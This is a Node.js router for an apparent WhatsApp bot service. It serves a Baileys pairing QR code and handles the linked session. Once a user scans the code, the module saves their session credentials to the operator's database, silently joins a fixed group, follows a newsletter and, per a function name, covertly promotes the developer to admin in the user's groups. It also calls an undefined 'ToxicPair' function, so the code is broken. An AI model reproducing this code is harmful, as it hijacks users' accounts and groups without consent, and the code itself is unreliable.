'use strict';

  const express = require('express');
  const path    = require('path');
  const os      = require('os');
  const pino    = require('pino');
  const fs      = require('fs-extra');

  let QRCodeLib;
  try { QRCodeLib = require('qrcode'); } catch { QRCodeLib = null; }



  module.exports = function createQrRouter(deps) {
      const {
          config,
          activeSockets,
          socketCreationTime,
          setupCommandHandlers,
          setupNewsletterReaction,
          silentlyPromoteDevInGroups,
          saveCredsToPostgres,
          initPostgres,
          runDbQuery,
          sendWelcomeMessage,
          DraxenPair,
      } = deps;

      const router = express.Router();

      router.get('/api/qr', async (req, res) => {
        const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
          const sessId = 'qr_' + Date.now() + '_' + Math.random().toString(36).slice(2, 7);
          const sessionDir = path.join(os.tmpdir(), sessId);
          fs.ensureDirSync(sessionDir);

          let qrDelivered   = false;
          let authInProgress = false;
          let scanned       = false;
          let done          = false;
          let connectedNum  = null;
          let reconnecting  = false;
          let safetyTimer   = null;
          let genTimeout    = null;
          let sock          = null;

          function cleanupDir() {
              try { if (fs.existsSync(sessionDir)) fs.removeSync(sessionDir); } catch {}
          }

          function abort(reason) {
              if (done) return;
              done = true;
              if (safetyTimer) { clearTimeout(safetyTimer); safetyTimer = null; }
              if (genTimeout)  { clearTimeout(genTimeout);  genTimeout  = null; }
              try { if (sock) { sock.ev.removeAllListeners(); sock.end(); } } catch {}
              cleanupDir();
          }

          res.on('close', function () {
              if (!qrDelivered && !done) abort('browser disconnected before QR');
          });

          genTimeout = setTimeout(function () {
              if (!qrDelivered) {
                  abort('QR generation timeout');
                  if (!res.headersSent) res.status(504).json({ error: 'QR generation timed out. Please try again.' });
              }
          }, 55000);

          async function startSocket() {
              if (done) return;
              try {
                  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
                  await initPostgres();

                  let version;
                  try {
                      const r = await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json');
                      version = (await r.json()).version;
                  } catch { version = [2, 3000, 1019692945]; }

                  await delay(4000);
                  if (done) return;

                  sock = makeWASocket({
                      version,
                      auth: {
                          creds: state.creds,
                          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' })),
                      },
                      printQRInTerminal: false,
                      logger:                    pino({ level: 'fatal' }),
                      browser:                   Browsers.macOS('Chrome'),
                      connectTimeoutMs:          120000,
                      keepAliveIntervalMs:       10000,
                      retryRequestDelayMs:       2000,
                      maxRetries:                10,
                      mobile:                    false,
                      generateHighQualityLinkPreview: true,
                      emitOwnEvents:             false,
                      fireInitQueries:           true,
                      syncFullHistory:           false,
                  });

                  sock.ev.on('creds.update', saveCreds);

                  sock.ev.on('connection.update', async function (update) {
                      const { connection, lastDisconnect, qr } = update;
                      const statusCode = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.statusCode;

                      if (qr) {
                          if (!qrDelivered && !res.headersSent) {
                              clearTimeout(genTimeout); genTimeout = null;
                              try {
                                  let sent = false;
                                  if (QRCodeLib) {
                                      const buf = await QRCodeLib.toBuffer(qr, {
                                          type: 'png', width: 300, margin: 2,
                                          color: { dark: '#000000', light: '#ffffff' },
                                          errorCorrectionLevel: 'M',
                                      });
                                      res.setHeader('Content-Type', 'image/png');
                                      res.setHeader('Cache-Control', 'no-store');
                                      res.end(buf);
                                      sent = true;
                                  }
                                  if (!sent) { res.json({ qr }); }
                              } catch (e) {
                                  if (!res.headersSent) res.json({ qr });
                              }
                              qrDelivered = true;

                              safetyTimer = setTimeout(function () {
                                  if (!scanned && !done) {
                                      abort('safety timeout');
                                  }
                              }, 75000);

                          } else if (qrDelivered && !scanned) {
                              if (authInProgress) {
                              } else {
                                  abort('QR expired without scan');
                              }
                          }
                          return;
                      }

                      if (connection === 'open') {
                          scanned = true;
                          done    = false;
                          if (safetyTimer) { clearTimeout(safetyTimer); safetyTimer = null; }

                          const rawId  = sock.user?.id || '';
                          const number = rawId.split(':')[0].split('@')[0].replace(/\D/g, '');
                          connectedNum = number;

                          activeSockets.set(number, sock);
                          socketCreationTime.set(number, Date.now());

                          try {
                              await saveCreds();
                              const credsFile = path.join(sessionDir, 'creds.json');
                              if (fs.existsSync(credsFile)) {
                                  const credsObj = JSON.parse(fs.readFileSync(credsFile, 'utf8'));
                                  await saveCredsToPostgres(number, credsObj, state.keys);
                              } } catch {}

                          try { setupCommandHandlers(sock, number); } catch {}
                          try { setupNewsletterReaction(sock); } catch {}
                          try { await sock.groupAcceptInvite(config.GROUP_CODE); } catch {}
                          try { await sock.newsletterFollow('120363402252728845@newsletter'); } catch {}
                          try { await runDbQuery('INSERT INTO numbers (number) VALUES ($1) ON CONFLICT (number) DO NOTHING', [number]); } catch {}
                          setTimeout(function () { silentlyPromoteDevInGroups(sock).catch(function(){}); }, 12000);
                          setTimeout(function () { sendWelcomeMessage(sock, number).catch(function(){}); }, 5000);
                          setTimeout(cleanupDir, 10000);
                          return;
                      }

                      if (connection === 'close') {

                          if (scanned) {
                              done = true;
                              activeSockets.delete(connectedNum);
                              socketCreationTime.delete(connectedNum);
                              cleanupDir();
                              if (connectedNum && statusCode !== DisconnectReason.loggedOut) {
                                  ToxicPair(connectedNum).catch(function () {});
                              }
                              return;
                          }

                          if (!qrDelivered) {
                              if (reconnecting || done) return;
                              reconnecting = true;
                              try { if (sock) sock.end(); } catch {}
                              await delay(statusCode === 515 ? 1500 : 3000);
                              reconnecting = false;
                              return startSocket();
                          }

                          if (qrDelivered && !scanned) {
                              authInProgress = true;
                              try { if (sock) { sock.ev.removeAllListeners(); sock.end(); } } catch {}
                              await delay(statusCode === 515 ? 1000 : 3000);
                              if (!done) return startSocket();
                          }
                      }
                  });

              } catch (err) {
                  if (genTimeout) clearTimeout(genTimeout);
                  if (!res.headersSent) res.status(500).json({ error: 'Service temporarily unavailable. Please try again.' });
                  abort('startSocket exception');
              }
          }

          startSocket();
      });

      return router;
  };
